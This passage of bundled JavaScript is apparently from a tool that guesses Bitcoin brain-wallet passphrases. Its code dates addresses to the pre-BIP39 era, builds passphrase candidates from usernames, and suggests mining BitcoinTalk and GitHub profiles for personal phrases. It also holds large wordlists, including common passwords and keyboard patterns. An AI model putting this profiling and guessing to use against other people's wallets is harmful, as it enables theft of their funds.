          const siblingForensics = await this.analyzeAddress(sibling);
          if (siblingForensics.creationTimestamp) {
            const siblingTime = siblingForensics.creationTimestamp.getTime();
            if (siblingTime >= windowStart.getTime() && siblingTime <= windowEnd.getTime()) {
              clusteredAddresses.push(sibling);
            }
          }
        }
        if (clusteredAddresses.length < 2) {
          return null;
        }
        return {
          centerAddress: address,
          addresses: clusteredAddresses,
          timeWindowStart: windowStart,
          timeWindowEnd: windowEnd,
          avgTimeBetweenCreation: 0,
          // TODO: Calculate
          confidence: clusteredAddresses.length / (forensics.siblingAddresses.length + 1)
        };
      }
      /**
       * Check if an address is from the pre-BIP39 era (before 2013)
       */
      isPreBIP39Era(forensics) {
        if (!forensics.creationTimestamp) return true;
        const bip39Date = /* @__PURE__ */ new Date("2013-09-01");
        return forensics.creationTimestamp < bip39Date;
      }
      /**
       * Estimate the likely key format based on creation date
       */
      estimateLikelyKeyFormat(forensics) {
        const formats = [];
        if (this.isPreBIP39Era(forensics)) {
          formats.push({
            format: "arbitrary",
            confidence: 0.8,
            reasoning: "Pre-2013 address - likely raw brain wallet (SHA256)"
          });
          formats.push({
            format: "random",
            confidence: 0.15,
            reasoning: "Could be early Bitcoin-Qt random key"
          });
          formats.push({
            format: "bip39",
            confidence: 0.05,
            reasoning: "BIP39 did not exist yet (very unlikely)"
          });
        } else {
          formats.push({
            format: "bip39",
            confidence: 0.6,
            reasoning: "Post-2013 address - BIP39 likely"
          });
          formats.push({
            format: "arbitrary",
            confidence: 0.25,
            reasoning: "Brain wallets still possible"
          });
          formats.push({
            format: "hd_wallet",
            confidence: 0.15,
            reasoning: "Could be HD wallet derivative"
          });
        }
        return formats.sort((a, b) => b.confidence - a.confidence);
      }
      /**
       * Analyze user history from BitcoinTalk and GitHub
       * Note: This is a stub - actual implementation would require scraping
       */
      async analyzeUserHistory(username) {
        console.log(`[BlockchainForensics] Analyzing user: ${username}`);
        const potentialPhrases = [
          username,
          username.toLowerCase(),
          username.replace(/[0-9]/g, ""),
          // Common patterns
          `${username}bitcoin`,
          `${username}2009`,
          `${username}satoshi`
        ];
        return {
          username,
          bitcointalkPosts: [],
          githubRepos: [],
          forumSignatures: [],
          extractedKeywords: [username.toLowerCase()],
          potentialPhrases
        };
      }
      /**
       * Search BitcoinTalk for posts by username
       * Returns potential passphrase hints
       */
      async searchBitcoinTalk(username) {
        const searchUrl = `https://bitcointalk.org/index.php?action=search2&advanced=1&search=${encodeURIComponent(username)}`;
        console.log(`[BlockchainForensics] BitcoinTalk search: ${searchUrl}`);
        return {
          posts: [],
          keywords: [username],
          hints: [
            `Search BitcoinTalk for user "${username}"`,
            "Look for wallet.dat discussions",
            "Check signature lines for personal info",
            "Note any memorable phrases or slogans"
          ]
        };
      }
      /**
       * Search GitHub for early Bitcoin-related repos
       */
      async searchGitHub(username) {
        const searchUrl = `https://github.com/search?q=${encodeURIComponent(username)}+created:<2014-01-01&type=users`;
        console.log(`[BlockchainForensics] GitHub search: ${searchUrl}`);
        return {
          repos: [],
          commits: [],
          hints: [
            `Search GitHub for user "${username}" created before 2014`,
            "Look for bitcoin-related repos",
            "Check commit messages for personal patterns",
            "Note any passphrase-like comments in code"
          ]
        };
      }
    };
    blockchainForensics = new BlockchainForensics();
  }
});

// server/expanded-vocabulary.ts
var expanded_vocabulary_exports = {};
__export(expanded_vocabulary_exports, {
  COMMON_ENGLISH_WORDS: () => COMMON_ENGLISH_WORDS,
  COMMON_NAMES: () => COMMON_NAMES,
  CRYPTO_TECH_WORDS: () => CRYPTO_TECH_WORDS,
  CULTURAL_REFERENCES: () => CULTURAL_REFERENCES,
  ExpandedVocabulary: () => ExpandedVocabulary,
  PASSPHRASE_PATTERNS: () => PASSPHRASE_PATTERNS,
  expandedVocabulary: () => expandedVocabulary
});
var COMMON_ENGLISH_WORDS, CRYPTO_TECH_WORDS, CULTURAL_REFERENCES, PASSPHRASE_PATTERNS, COMMON_NAMES, ExpandedVocabulary, expandedVocabulary;
var init_expanded_vocabulary = __esm({
  "server/expanded-vocabulary.ts"() {
    "use strict";
    COMMON_ENGLISH_WORDS = [
      // Top 100 most used
      "the",
      "be",
      "to",
      "of",
      "and",
      "a",
      "in",
      "that",
      "have",
      "i",
      "it",
      "for",
      "not",
      "on",
      "with",
      "he",
      "as",
      "you",
      "do",
      "at",
      "this",
      "but",
      "his",
      "by",
      "from",
      "they",
      "we",
      "say",
      "her",
      "she",
      "or",
      "an",
      "will",
      "my",
      "one",
      "all",
      "would",
      "there",
      "their",
      "what",
      "so",
      "up",
      "out",
      "if",
      "about",
      "who",
      "get",
      "which",
      "go",
      "me",
      "when",
      "make",
      "can",
      "like",
      "time",
      "no",
      "just",
      "him",
      "know",
      "take",
      "people",
      "into",
      "year",
      "your",
      "good",
      "some",
      "could",
      "them",
      "see",
      "other",
      "than",
      "then",
      "now",
      "look",
      "only",
      "come",
      "its",
      "over",
      "think",
      "also",
      "back",
      "after",
      "use",
      "two",
      "how",
      "our",
      "work",
      "first",
      "well",
      "way",
      "even",
      "new",
      "want",
      "because",
      "any",
      "these",
      "give",
      "day",
      "most",
      "us",
      // Common nouns
      "world",
      "life",
      "hand",
      "part",
      "child",
      "eye",
      "woman",
      "place",
      "case",
      "week",
      "company",
      "system",
      "program",
      "question",
      "work",
      "government",
      "number",
      "night",
      "point",
      "home",
      "water",
      "room",
      "mother",
      "area",
      "money",
      "story",
      "fact",
      "month",
      "lot",
      "right",
      "study",
      "book",
      "job",
      "word",
      "business",
      "issue",
      "side",
      "kind",
      "head",
      "house",
      "service",
      "friend",
      "father",
      "power",
      "hour",
      "game",
      "line",
      "end",
      "member",
      "law",
      "car",
      "city",
      "community",
      "name",
      "president",
      "team",
      "minute",
      "idea",
      "kid",
      "body",
      "information",
      "school",
      "face",
      "others",
      "level",
      "office",
      "door",
      "health",
      "person",
      "art",
      "war",
      "history",
      "party",
      "result",
      "change",
      "morning",
      "reason",
      "research",
      "girl",
      "guy",
      "moment",
      "air",
      "teacher",
      "force",
      "education",
      "foot",
      "boy",
      "age",
      "policy",
      "process",
      "music",
      "market",
      "sense",
      "nation",
      "plan",
      "college",
      "interest",
      "death",
      "experience",
      "effect",
      // Common verbs
      "run",
      "move",
      "live",
      "believe",
      "hold",
      "bring",
      "happen",
      "must",
      "write",
      "provide",
      "sit",
      "stand",
      "lose",
      "pay",
      "meet",
      "include",
      "continue",
      "set",
      "learn",
      "change",
      "lead",
      "understand",
      "watch",
      "follow",
      "stop",
      "create",
      "speak",
      "read",
      "allow",
      "add",
      "spend",
      "grow",
      "open",
      "walk",
      "win",
      "offer",
      "remember",
      "love",
      "consider",
      "appear",
      "buy",
      "wait",
      "serve",
      "die",
      "send",
      "expect",
      "build",
      "stay",
      "fall",
      "cut",
      "reach",
      "kill",
      "remain",
      "suggest",
      "raise",
      "pass",
      "sell",
      "require",
      "report",
      "decide",
      "pull",
      "break",
      "push",
      "carry",
      "develop",
      "produce",
      "return",
      "receive",
      "keep",
      "play",
      // Common adjectives
      "old",
      "right",
      "big",
      "high",
      "different",
      "small",
      "large",
      "next",
      "early",
      "young",
      "important",
      "few",
      "public",
      "bad",
      "same",
      "able",
      "free",
      "sure",
      "great",
      "long",
      "little",
      "real",
      "strong",
      "possible",
      "white",
      "local",
      "clear",
      "recent",
      "special",
      "true",
      "hard",
      "full",
      "open",
      "late",
      "easy",
      "close",
      "black",
      "short",
      "best",
      "better",
      "human",
      "social",
      "major",
      "political",
      "economic",
      "simple",
      "military",
      "whole",
      "national",
      "single",
      "happy",
      "serious",
      "ready",
      "final",
      "green",
      "dark",
      "fine",
      "deep",
      "past",
      "wrong",
      "present",
      "poor",
      "natural",
      "significant",
      "similar",
      "hot",
      "dead",
      "central",
      "likely",
      "available",
      // Numbers as words
      "zero",
      "one",
      "two",
      "three",
      "four",
      "five",
      "six",
      "seven",
      "eight",
      "nine",
      "ten",
      "eleven",
      "twelve",
      "thirteen",
      "fourteen",
      "fifteen",
      "sixteen",
      "seventeen",
      "eighteen",
      "nineteen",
      "twenty",
      "thirty",
      "forty",
      "fifty",
      "sixty",
      "seventy",
      "eighty",
      "ninety",
      "hundred",
      "thousand",
      "million",
      "billion",
      "first",
      "second",
      "third",
      "fourth",
      "fifth",
      "sixth",
      "seventh",
      "eighth",
      "ninth",
      "tenth",
      "half",
      "quarter",
      "double",
      "triple",
      // Nature words
      "sun",
      "moon",
      "star",
      "sky",
      "earth",
      "fire",
      "wind",
      "rain",
      "snow",
      "ice",
      "mountain",
      "river",
      "ocean",
      "sea",
      "lake",
      "forest",
      "tree",
      "flower",
      "grass",
      "rock",
      "stone",
      "sand",
      "cloud",
      "thunder",
      "lightning",
      "storm",
      "wave",
      "island",
      "valley",
      "hill",
      "desert",
      "jungle",
      "garden",
      "field",
      "meadow",
      "stream",
      "pond",
      "waterfall",
      "spring",
      "autumn",
      "summer",
      "winter",
      "season",
      "weather",
      "climate",
      "rainbow",
      "sunset",
      "sunrise",
      "dawn",
      "dusk",
      // Animals
      "dog",
      "cat",
      "bird",
      "fish",
      "horse",
      "cow",
      "pig",
      "sheep",
      "chicken",
      "duck",
      "lion",
      "tiger",
      "bear",
      "wolf",
      "fox",
      "deer",
      "rabbit",
      "mouse",
      "rat",
      "snake",
      "eagle",
      "hawk",
      "owl",
      "crow",
      "sparrow",
      "whale",
      "dolphin",
      "shark",
      "octopus",
      "crab",
      "elephant",
      "monkey",
      "gorilla",
      "kangaroo",
      "penguin",
      "butterfly",
      "bee",
      "ant",
      "spider",
      "dragon",
      // Body parts
      "head",
      "face",
      "eye",
      "ear",
      "nose",
      "mouth",
      "hand",
      "arm",
      "leg",
      "foot",
      "heart",
      "brain",
      "blood",
      "bone",
      "skin",
      "hair",
      "finger",
      "toe",
      "neck",
      "shoulder",
      "chest",
      "stomach",
      "back",
      "knee",
      "elbow",
      "wrist",
      "ankle",
      "tongue",
      "tooth",
      "lip",
      // Colors
      "red",
      "blue",
      "green",
      "yellow",
      "orange",
      "purple",
      "pink",
      "brown",
      "black",
      "white",
      "gray",
      "silver",
      "gold",
      "bronze",
      "copper",
      "crimson",
      "scarlet",
      "violet",
      "indigo",
      "cyan",
      "magenta",
      "turquoise",
      "teal",
      "navy",
      "maroon",
      "olive",
      "lime",
      "coral",
      "salmon",
      "ivory",
      // Time words
      "second",
      "minute",
      "hour",
      "day",
      "week",
      "month",
      "year",
      "decade",
      "century",
      "millennium",
      "today",
      "tomorrow",
      "yesterday",
      "morning",
      "afternoon",
      "evening",
      "night",
      "midnight",
      "noon",
      "dawn",
      "forever",
      "always",
      "never",
      "sometimes",
      "often",
      "rarely",
      "usually",
      "occasionally",
      "frequently",
      "daily",
      // Family
      "family",
      "parent",
      "mother",
      "father",
      "mom",
      "dad",
      "child",
      "son",
      "daughter",
      "brother",
      "sister",
      "grandfather",
      "grandmother",
      "grandpa",
      "grandma",
      "uncle",
      "aunt",
      "cousin",
      "nephew",
      "niece",
      "husband",
      "wife",
      "spouse",
      "partner",
      "baby",
      "infant",
      "toddler",
      "teenager",
      "adult",
      "elder",
      // Emotions
      "love",
      "hate",
      "fear",
      "hope",
      "joy",
      "anger",
      "sadness",
      "happiness",
      "surprise",
      "disgust",
      "trust",
      "anticipation",
      "peace",
      "calm",
      "anxiety",
      "stress",
      "relief",
      "excitement",
      "boredom",
      "confusion",
      "pride",
      "shame",
      "guilt",
      "jealousy",
      "envy",
      "gratitude",
      "compassion",
      "empathy",
      "sympathy",
      "nostalgia",
      // Food and drink
      "food",
      "water",
      "bread",
      "meat",
      "fruit",
      "vegetable",
      "rice",
      "pasta",
      "pizza",
      "burger",
      "coffee",
      "tea",
      "milk",
      "juice",
      "wine",
      "beer",
      "sugar",
      "salt",
      "pepper",
      "spice",
      "apple",
      "banana",
      "orange",
      "grape",
      "lemon",
      "strawberry",
      "chocolate",
      "cheese",
      "butter",
      "egg",
      // Places
      "home",
      "house",
      "apartment",
      "room",
      "kitchen",
      "bedroom",
      "bathroom",
      "office",
      "school",
      "hospital",
      "church",
      "temple",
      "mosque",
      "library",
      "museum",
      "theater",
      "restaurant",
      "hotel",
      "park",
      "beach",
      "airport",
      "station",
      "store",
      "shop",
      "market",
      "bank",
      "factory",
      "farm",
      "prison",
      "castle",
      // Transportation
      "car",
      "truck",
      "bus",
      "train",
      "plane",
      "boat",
      "ship",
      "bicycle",
      "motorcycle",
      "helicopter",
      "subway",
      "taxi",
      "ambulance",
      "rocket",
      "spaceship",
      "submarine",
      "yacht",
      "ferry",
      "scooter",
      "wagon",
      // Objects
      "phone",
      "computer",
      "television",
      "radio",
      "camera",
      "book",
      "pen",
      "pencil",
      "paper",
      "table",
      "chair",
      "bed",
      "door",
      "window",
      "wall",
      "floor",
      "ceiling",
      "roof",
      "stairs",
      "lamp",
      "clock",
      "watch",
      "mirror",
      "picture",
      "bottle",
      "cup",
      "plate",
      "fork",
      "knife",
      "spoon",
      "bag",
      "box",
      "key",
      "lock",
      "tool",
      "machine",
      "engine",
      "wheel",
      "button",
      "screen",
      // Abstract concepts
      "truth",
      "lie",
      "justice",
      "freedom",
      "peace",
      "war",
      "love",
      "hate",
      "life",
      "death",
      "time",
      "space",
      "energy",
      "power",
      "force",
      "nature",
      "culture",
      "society",
      "history",
      "future",
      "dream",
      "reality",
      "fantasy",
      "imagination",
      "memory",
      "thought",
      "idea",
      "belief",
      "knowledge",
      "wisdom",
      "success",
      "failure",
      "victory",
      "defeat",
      "challenge",
      "opportunity",
      "risk",
      "reward",
      "consequence",
      "fate",
      // Actions
      "start",
      "stop",
      "begin",
      "end",
      "create",
      "destroy",
      "build",
      "break",
      "fix",
      "repair",
      "open",
      "close",
      "enter",
      "exit",
      "arrive",
      "leave",
      "come",
      "go",
      "stay",
      "move",
      "find",
      "lose",
      "search",
      "discover",
      "explore",
      "investigate",
      "analyze",
      "solve",
      "answer",
      "question",
      "help",
      "hurt",
      "save",
      "protect",
      "attack",
      "defend",
      "fight",
      "compete",
      "cooperate",
      "collaborate"
    ];
    CRYPTO_TECH_WORDS = [
      // Bitcoin core terms
      "bitcoin",
      "btc",
      "satoshi",
      "nakamoto",
      "blockchain",
      "block",
      "chain",
      "mining",
      "miner",
      "hash",
      "hashing",
      "hashrate",
      "hashpower",
      "wallet",
      "address",
      "key",
      "private",
      "public",
      "secret",
      "transaction",
      "tx",
      "txid",
      "utxo",
      "input",
      "output",
      "signature",
      "sign",
      "verify",
      "validate",
      "confirm",
      "confirmation",
      "fee",
      "reward",
      "coinbase",
      "genesis",
      "halving",
      "difficulty",
      "target",
      "nonce",
      "merkle",
      "timestamp",
      "node",
      "peer",
      "network",
      "p2p",
      "decentralized",
      "distributed",
      "consensus",
      "proof",
      "work",
      "stake",
      "pow",
      "pos",
      "fork",
      "softfork",
      "hardfork",
      "orphan",
      "stale",
      "mempool",
      "propagate",
      "broadcast",
      "relay",
      "segwit",
      "lightning",
      "layer2",
      "sidechain",
      "channel",
      // Cryptography
      "cryptography",
      "crypto",
      "encrypt",
      "decrypt",
      "cipher",
      "algorithm",
      "sha256",
      "sha",
      "md5",
      "ripemd",
      "ripemd160",
      "ecdsa",
      "secp256k1",
      "curve",
      "elliptic",
      "point",
      "modular",
      "modulus",
      "exponent",
      "prime",
      "generator",
      "random",
      "entropy",
      "seed",
      "deterministic",
      "pseudorandom",
      "hmac",
      "pbkdf2",
      "scrypt",
      "argon2",
      "bcrypt",
      "aes",
      "rsa",
      "dsa",
      "dh",
      "diffie",
      "hellman",
      "symmetric",
      "asymmetric",
      "keystream",
      "block cipher",
      "stream cipher",
      "padding",
      "salt",
      "iv",
      "initialization",
      "vector",
      "checksum",
      "crc",
      "parity",
      "redundancy",
      "zero knowledge",
      "zk",
      "zksnark",
      "zkstark",
      "proof",
      // Programming & software
      "code",
      "program",
      "software",
      "hardware",
      "system",
      "application",
      "function",
      "variable",
      "array",
      "object",
      "class",
      "method",
      "loop",
      "condition",
      "statement",
      "expression",
      "operator",
      "compile",
      "execute",
      "run",
      "debug",
      "test",
      "deploy",
      "server",
      "client",
      "api",
      "protocol",
      "interface",
      "module",
      "database",
      "query",
      "index",
      "cache",
      "buffer",
      "memory",
      "cpu",
      "gpu",
      "asic",
      "fpga",
      "processor",
      "chip",
      "binary",
      "hex",
      "hexadecimal",
      "octal",
      "decimal",
      "base58",
      "encode",
      "decode",
      "serialize",
      "deserialize",
      "parse",
      "format",
      "git",
      "github",
      "repository",
      "commit",
      "branch",
      "merge",
      "linux",
      "unix",
      "windows",
      "mac",
      "terminal",
      "command",
      "python",
      "javascript",
      "rust",
      "go",
      "cpp",
      "java",
      "open source",
      "foss",
      "gnu",
      "gpl",
      "mit",
      "apache",
      // Internet & networking
      "internet",
      "web",
      "website",
      "browser",
      "url",
      "http",
      "https",
      "ip",
      "tcp",
      "udp",
      "dns",
      "ssl",
      "tls",
      "certificate",
      "port",
      "socket",
      "connection",
      "packet",
      "bandwidth",
      "latency",
      "router",
      "switch",
      "firewall",
      "vpn",
      "proxy",
      "tor",
      "onion",
      "hidden",
      "anonymous",
      "privacy",
      "surveillance",
      "email",
      "smtp",
      "imap",
      "pop3",
      "spam",
      "phishing",
      "social media",
      "facebook",
      "twitter",
      "reddit",
      "forum",
      "cloud",
      "aws",
      "azure",
      "gcp",
      "hosting",
      "domain",
      // Fintech & trading
      "exchange",
      "trade",
      "buy",
      "sell",
      "order",
      "market",
      "limit",
      "stop",
      "margin",
      "leverage",
      "long",
      "short",
      "bull",
      "bear",
      "pump",
      "dump",
      "whale",
      "hodl",
      "fomo",
      "fud",
      "ath",
      "atl",
      "moon",
      "lambo",
      "portfolio",
      "diversify",
      "risk",
      "return",
      "yield",
      "apy",
      "staking",
      "lending",
      "borrowing",
      "collateral",
      "liquidation",
      "defi",
      "dex",
      "amm",
      "liquidity",
      "pool",
      "swap",
      "nft",
      "token",
      "erc20",
      "erc721",
      "smart contract",
      "solidity",
      "ethereum",
      "eth",
      "altcoin",
      "shitcoin",
      "memecoin",
      "ico",
      "ido",
      "airdrop",
      "presale",
      "whitelist"
    ];
    CULTURAL_REFERENCES = [
      // 2009 era references
      "obama",
      "financial crisis",
      "bailout",
      "lehman",
      "recession",
      "occupy",
      "wall street",
      "federal reserve",
      "quantitative easing",
      "michael jackson",
      "avatar",
      "twitter",
      "facebook",
      "iphone",
      "android",
      "app store",
      "smartphone",
      "h1n1",
      "swine flu",
      "pandemic",
      "youtube",
      "viral",
      "meme",
      "rickroll",
      // Tech culture
      "hacker",
      "cypherpunk",
      "crypto anarchist",
      "libertarian",
      "open source",
      "free software",
      "gnu",
      "linux",
      "silicon valley",
      "startup",
      "venture capital",
      "disruption",
      "singularity",
      "artificial intelligence",
      "machine learning",
      "matrix",
      "red pill",
      "blue pill",
      "simulation",
      "cyberpunk",
      "dystopia",
      "utopia",
      "technocracy",
      // Internet culture
      "lol",
      "rofl",
      "lmao",
      "brb",
      "afk",
      "gg",
      "wp",
      "noob",
      "pwned",
      "rekt",
      "based",
      "cringe",
      "dank",
      "normie",
      "chad",
      "virgin",
      "wojak",
      "pepe",
      "kek",
      "lulz",
      "anon",
      "anonymous",
      "legion",
      "4chan",
      "reddit",
      "discord",
      "telegram",
      "troll",
      "bot",
      "shill",
      "scam",
      "rugpull",
      // Gaming
      "game",
      "gamer",
      "player",
      "level",
      "boss",
      "quest",
      "rpg",
      "mmorpg",
      "fps",
      "rts",
      "moba",
      "steam",
      "playstation",
      "xbox",
      "nintendo",
      "pc master race",
      "esports",
      "twitch",
      "streamer",
      "speedrun",
      "minecraft",
      "fortnite",
      "pubg",
      "csgo",
      "dota",
      "league",
      // Movies & pop culture
      "star wars",
      "lord of the rings",
      "harry potter",
      "marvel",
      "avengers",
      "thanos",
      "infinity",
      "endgame",
      "game of thrones",
      "breaking bad",
      "walking dead",
      "fight club",
      "inception",
      "interstellar",
      "blade runner",
      "terminator",
      "skynet",
      "judgment day",
      "cyberdyne",
      "back to the future",
      "delorean",
      "flux capacitor",
      // Music
      "rock",
      "metal",
      "punk",
      "hip hop",
      "rap",
      "edm",
      "guitar",
      "drums",
      "bass",
      "synth",
      "vinyl",
      "beatles",
      "nirvana",
      "metallica",
      "radiohead",
      "underground",
      "indie",
      "alternative",
      "mainstream",
      // Philosophy & religion
      "god",
      "devil",
      "angel",
      "demon",
      "heaven",
      "hell",
      "karma",
      "dharma",
      "nirvana",
      "enlightenment",
      "zen",
      "stoic",
      "epicurean",
      "nihilist",
      "existentialist",
      "plato",
      "aristotle",
      "socrates",
      "descartes",
      "kant",
      "truth",
      "beauty",
      "good",
      "evil",
      "virtue",
      "vice",
      // Science & math
      "einstein",
      "newton",
      "darwin",
      "hawking",
      "feynman",
      "relativity",
      "quantum",
      "particle",
      "wave",
      "field",
      "atom",
      "molecule",
      "electron",
      "proton",
      "neutron",
      "energy",
      "mass",
      "speed",
      "light",
      "gravity",
      "pi",
      "euler",
      "fibonacci",
      "prime",
      "infinity",
      "calculus",
      "algebra",
      "geometry",
      "topology",
      "chaos"
    ];
    PASSPHRASE_PATTERNS = [
      // Simple patterns
      "password",
      "password1",
      "password123",
      "pass123",
      "passwd",
      "123456",
      "12345678",
      "1234567890",
      "qwerty",
      "qwertyuiop",
      "abc123",
      "abcdef",
      "abcd1234",
      "test",
      "test123",
      "admin",
      "root",
      "administrator",
      "master",
      "super",
      "login",
      "welcome",
      "hello",
      "letmein",
      "changeme",
      // Personal info patterns
      "myname",
      "firstname",
      "lastname",
      "birthday",
      "mybirthday",
      "iloveyou",
      "loveyou",
      "mylove",
      "mypassword",
      "mysecret",
      "mydog",
      "mycat",
      "mypet",
      "mycar",
      "myhouse",
      // Keyboard patterns
      "asdfgh",
      "asdfghjkl",
      "zxcvbn",
      "zxcvbnm",
      "1qaz2wsx",
      "qazwsx",
      "1q2w3e4r",
      "1234qwer",
      // Phrases
      "the quick brown fox",
      "jumps over the lazy dog",
      "correct horse battery staple",
      "to be or not to be",
      "i am the one",
      "trust no one",
      "remember remember",
      "winter is coming",
      "may the force",
      "live long and prosper",
      "one ring to rule",
      "all your base",
      "do or do not",
      // Dates and numbers
      "jan",
      "feb",
      "mar",
      "apr",
      "may",
      "jun",
      "jul",
      "aug",
      "sep",
      "oct",
      "nov",
      "dec",
      "monday",
      "tuesday",
      "wednesday",
      "thursday",
      "friday",
      "saturday",
      "sunday",
      "2008",
      "2009",
      "2010",
      "2011",
      "2012",
      "2013",
      "2014",
      "2015",
      // Crypto specific
      "satoshi",
      "nakamoto",
      "bitcoin",
      "btc",
      "genesis",
      "blockchain",
      "crypto",
      "wallet",
      "mining",
      "hodl",
      "to the moon",
      "when lambo",
      "diamond hands",
      "paper hands"
    ];
    COMMON_NAMES = [
      // Male names
      "james",
      "john",
      "robert",
      "michael",
      "william",
      "david",
      "richard",
      "joseph",
      "thomas",
      "charles",
      "christopher",
      "daniel",
      "matthew",
      "anthony",
      "mark",
      "donald",
      "steven",
      "paul",
      "andrew",
      "joshua",
      "kenneth",
      "kevin",
      "brian",
      "george",
      "timothy",
      "ronald",
      "edward",
      "jason",
      "jeffrey",
      "ryan",
      "jacob",
      "gary",
      "nicholas",
      "eric",
      "jonathan",
      "stephen",
      "larry",
      "justin",
      "scott",
      "brandon",
      "benjamin",
      "samuel",
      "raymond",
      "gregory",
      "frank",
      "alexander",
      "patrick",
      "jack",
      "dennis",
      "jerry",
      "tyler",
      "aaron",
      "jose",
      "adam",
      "nathan",
      "henry",
      "douglas",
      // Female names
      "mary",
      "patricia",
      "jennifer",
      "linda",
      "elizabeth",
      "barbara",
      "susan",
      "jessica",
      "sarah",
      "karen",
      "lisa",
      "nancy",
      "betty",
      "margaret",
      "sandra",
      "ashley",
      "kimberly",
      "emily",
      "donna",
      "michelle",
      "dorothy",
      "carol",
      "amanda",
      "melissa",
      "deborah",
      "stephanie",
      "rebecca",
      "sharon",
      "laura",
      "cynthia",
      "kathleen",
      "amy",
      "angela",
      "shirley",
      "anna",
      "brenda",
      "pamela",
      "emma",
      "nicole",
      "helen",
      "samantha",
      "katherine",
      "christine",
      "debra",
      "rachel",
      "carolyn",
      "janet",
      "catherine",
      "maria",
      "heather",
      "diane",
      "ruth",
      "julie",
      "olivia",
      "joyce",
      "virginia",
      "victoria",
      // Tech/crypto notable names
      "satoshi",
      "nakamoto",
      "hal",
      "finney",
      "nick",
      "szabo",
      "wei",
      "dai",
      "vitalik",
      "buterin",
      "gavin",
      "andresen",
      "roger",
      "ver",
      "charlie",
      "lee",
      "andreas",
      "antonopoulos",
      "adam",
      "back",
      "craig",
      "wright",
      "elon",
      "musk",
      "jack",
      "dorsey",
      "cathie",
      "wood",
      "michael",
      "saylor"
    ];
    ExpandedVocabulary = class {
      allWords;
      wordsByCategory;
      learnedWords;
      wordFrequencies;
      constructor() {
        this.allWords = /* @__PURE__ */ new Set();
        this.wordsByCategory = /* @__PURE__ */ new Map();
        this.learnedWords = /* @__PURE__ */ new Set();
        this.wordFrequencies = /* @__PURE__ */ new Map();
        this.addCategory("common", COMMON_ENGLISH_WORDS);
        this.addCategory("crypto", CRYPTO_TECH_WORDS);
        this.addCategory("cultural", CULTURAL_REFERENCES);
        this.addCategory("patterns", PASSPHRASE_PATTERNS);
        this.addCategory("names", COMMON_NAMES);
        console.log(`[ExpandedVocabulary] Initialized with ${this.allWords.size} unique words across ${this.wordsByCategory.size} categories`);
      }
      addCategory(name, words) {
        const normalized = words.map((w) => w.toLowerCase().trim()).filter((w) => w.length > 0);
        this.wordsByCategory.set(name, normalized);
        normalized.forEach((w) => this.allWords.add(w));
      }
      /**
       * Get all words as array
       */
      getAllWords() {
        return Array.from(this.allWords);
      }
      /**
       * Get words by category
       */
      getCategory(category) {
        return this.wordsByCategory.get(category) || [];
      }
      /**
       * Get categories
       */
      getCategories() {
        return Array.from(this.wordsByCategory.keys());
      }
      /**
       * Check if word exists
       */
      hasWord(word) {
        return this.allWords.has(word.toLowerCase());
      }
      /**
       * Add learned word from discovery
       */
      learnWord(word, frequency = 1) {
        const normalized = word.toLowerCase().trim();
        if (normalized.length > 0) {
          this.learnedWords.add(normalized);
          this.allWords.add(normalized);
          const currentFreq = this.wordFrequencies.get(normalized) || 0;
          this.wordFrequencies.set(normalized, currentFreq + frequency);
        }
      }
      /**
       * Get learned words
       */
      getLearnedWords() {
        return Array.from(this.learnedWords);
      }
      /**
       * Get word frequency
       */
      getWordFrequency(word) {
        return this.wordFrequencies.get(word.toLowerCase()) || 0;
      }
      /**
       * Get top words by frequency
       */
      getTopFrequencyWords(limit = 100) {
        return Array.from(this.wordFrequencies.entries()).sort((a, b) => b[1] - a[1]).slice(0, limit).map(([word, frequency]) => ({ word, frequency }));
      }
      /**
       * Random word from category
       */
      randomWord(category) {
        const words = category ? this.getCategory(category) : this.getAllWords();
        return words[Math.floor(Math.random() * words.length)] || "bitcoin";
      }
      /**
       * Random words from vocabulary
       */
      randomWords(count, category) {
        const words = [];
        for (let i = 0; i < count; i++) {
          words.push(this.randomWord(category));
        }
        return words;
      }
      /**
       * Get vocabulary statistics
       */
      getStats() {
        const categoryCounts = {};
        for (const [name, words] of Array.from(this.wordsByCategory.entries())) {
          categoryCounts[name] = words.length;
        }
        return {
          totalWords: this.allWords.size,
          categoryCounts,
          learnedCount: this.learnedWords.size,
          topFrequencies: this.getTopFrequencyWords(20)
        };
      }
      /**
       * Export vocabulary for persistence
       */
      export() {
        return {
          learned: Array.from(this.learnedWords),
          frequencies: Array.from(this.wordFrequencies.entries())
        };
      }
      /**
       * Import vocabulary from persistence
       */
      import(data) {
        if (data.learned) {
          data.learned.forEach((w) => this.learnedWords.add(w));
          data.learned.forEach((w) => this.allWords.add(w));
        }
        if (data.frequencies) {
          data.frequencies.forEach(([word, freq]) => {
            this.wordFrequencies.set(word, freq);
            this.allWords.add(word);
          });
        }
        console.log(`[ExpandedVocabulary] Imported ${data.learned?.length || 0} learned words, ${data.frequencies?.length || 0} frequency records`);
      }
    };
    expandedVocabulary = new ExpandedVocabulary();
  }
});

// server/vocabulary-decision.ts
import * as fs3 from "fs";
import * as path3 from "path";
function computeGeometricValue(word, observations, _allObservations) {
  const frequency = observations.frequency;
  const efficiencyRaw = Math.log10(1 + frequency) / 3;
  const efficiency = Math.min(1, efficiencyRaw * observations.avgPhi);
  const phiWeight = observations.avgPhi;
  const connectivity = computeConceptConnectivity(observations.contextEmbeddings);
  const wordLength = word.split(/\s+/).length;
  const compression = Math.min(1, (wordLength - 1) * 0.3 + word.length * 0.02);
  const total = 0.3 * efficiency + 0.3 * phiWeight + 0.2 * connectivity + 0.2 * compression;
  return {
    efficiency,
    phiWeight,
    connectivity,
    compression,
    total
  };
}
function computeConceptConnectivity(embeddings) {
  if (embeddings.length < 2) return 0;
  let totalDistance = 0;
  let pairs = 0;
  const limit = Math.min(embeddings.length, 20);
  for (let i = 0; i < limit; i++) {
    for (let j = i + 1; j < limit; j++) {
      const dist = fisherCoordDistance(embeddings[i], embeddings[j]);
      totalDistance += dist;
      pairs++;
    }
  }
  if (pairs === 0) return 0;
  const avgDistance = totalDistance / pairs;
  return Math.min(1, avgDistance / 5);
}
function checkBasinStability(word, wordObservation, currentBasin, referenceBasin) {
  const currentDrift = fisherCoordDistance(currentBasin, referenceBasin);
  const wordCenter = computeWordCenter(wordObservation.contextEmbeddings);
  if (wordCenter.length === 0) {
    return {
      stable: true,
      drift: currentDrift,
      withinThreshold: true,
      acceptable: true
    };
  }
  const totalObs = wordObservation.frequency;
  const weight = Math.min(0.1, totalObs / 1e3);
  const simulatedBasin = currentBasin.map((coord, i) => {
    const wordCoord = wordCenter[i] || 0;
    return coord * (1 - weight) + wordCoord * weight;
  });
  const newDrift = fisherCoordDistance(simulatedBasin, referenceBasin);
